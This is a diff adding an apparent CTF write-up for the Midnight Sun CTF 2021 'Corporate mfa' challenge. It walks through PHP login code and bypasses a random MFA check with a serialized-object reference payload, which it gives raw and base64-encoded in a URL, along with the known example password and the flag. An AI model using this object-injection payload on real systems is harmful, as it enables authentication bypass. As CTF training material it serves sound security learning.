@@ -1,0 +1,80 @@
+<h1>Midnight Sun CTF 2021 "Corporate mfa" writeup</h1>
+
+<h2>Challenge</h2>
+
+<p>The source for this corporate zero-trust multi factor login portal has been leaked! Figure out how to defeat the super-secure one time code.
+settings Service: http://corpmfa-01.play.midnightsunctf.se</p>
+
+<h2>Solution</h2>
+
+<p>We need to break through the <code>verify()</code> function.</p>
+
+<p>```php
+    public function verify()
+    {
+        if (!$this->verifyUsername())
+            throw new InvalidArgumentException('Invalid username');</p>
+
+<pre><code>    if (!$this-&gt;verifyPassword())
+        throw new InvalidArgumentException('Invalid password');
+
+    if (!$this-&gt;verifyMFA())
+        throw new InvalidArgumentException('Invalid MFA token value');
+
+    return true;
+}
+</code></pre>
+
+<p>```</p>
+
+<p>First, <code>verifyUsername()</code> is a simple string comparison.</p>
+
+<p><code>php
+    private function verifyUsername()
+    {
+        return $this-&gt;userData-&gt;username === 'D0loresH4ze';
+    }
+</code></p>
+
+<p>Second, <code>verifyPassword()</code> is a password inspection using bcrypt.</p>
+
+<p><code>php
+    private function verifyPassword()
+    {
+        return password_verify($this-&gt;userData-&gt;password, '$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq');
+    }
+</code></p>
+
+<p>This hash is well known in <a href="https://www.php.net/manual/en/function.password-verify.php">PHP manual</a>.</p>
+
+<p>The password is <code>rasmuslerdorf</code>.</p>
+
+<p>And finally, <code>verifyMFA()</code> is inspection of a number that is 10 digit random number.</p>
+
+<p><code>php
+    private function verifyMFA()
+    {
+        $this-&gt;userData-&gt;_correctValue = random_int(1e10, 1e11 - 1);
+        return (int)$this-&gt;userData-&gt;mfa === $this-&gt;userData-&gt;_correctValue;
+    }
+</code></p>
+
+<p>This is very difficult to break through. However, the variable <code>mfa</code> is created by unserializing user requests.</p>
+
+<p>So, it is possible to determine that <code>mfa</code> and <code>_correctValue</code> match by using <code>mfa</code> as the reference of <code>_correctValue</code> by object injection.</p>
+
+<p>Answer is</p>
+
+<p><code>
+O:8:"stdClass":4:{s:8:"username";s:11:"D0loresH4ze";s:8:"password";s:13:"rasmuslerdorf";s:13:"_correctValue";N;s:3:"mfa";R:4;}
+</code></p>
+
+<p>And create userdata parameter by base64 encoding.</p>
+
+<p><a href="http://corpmfa-01.play.midnightsunctf.se/?userdata=Tzo4OiJzdGRDbGFzcyI6NDp7czo4OiJ1c2VybmFtZSI7czoxMToiRDBsb3Jlc0g0emUiO3M6ODoicGFzc3dvcmQiO3M6MTM6InJhc211c2xlcmRvcmYiO3M6MTM6Il9jb3JyZWN0VmFsdWUiO047czozOiJtZmEiO1I6NDt9">http://corpmfa-01.play.midnightsunctf.se/?userdata=Tzo4OiJzdGRDbGFzcyI6NDp7czo4OiJ1c2VybmFtZSI7czoxMToiRDBsb3Jlc0g0emUiO3M6ODoicGFzc3dvcmQiO3M6MTM6InJhc211c2xlcmRvcmYiO3M6MTM6Il9jb3JyZWN0VmFsdWUiO047czozOiJtZmEiO1I6NDt9</a></p>
+
+<p>I got flag.</p>
+
+<p><code>
+midnight{395E160F-4DB8-4D7A-99EF-08E6799741B5}
+</code></p>
